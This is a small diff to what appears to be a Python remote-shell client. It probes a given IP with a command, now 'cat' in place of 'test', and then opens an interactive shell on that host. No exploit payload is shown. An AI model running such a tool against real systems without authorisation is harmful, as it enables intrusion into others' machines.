@@ -25,7 +25,7 @@ def main():
     if len(sys.argv) != 2:
         print(f'Usage: {sys.argv[0]} IP')
     ip = sys.argv[1]
-    if not send_request(ip, "test"):
+    if not send_request(ip, "cat"):
         print("Shell: test command got no response, exiting...")
         return
     run_shell(ip)
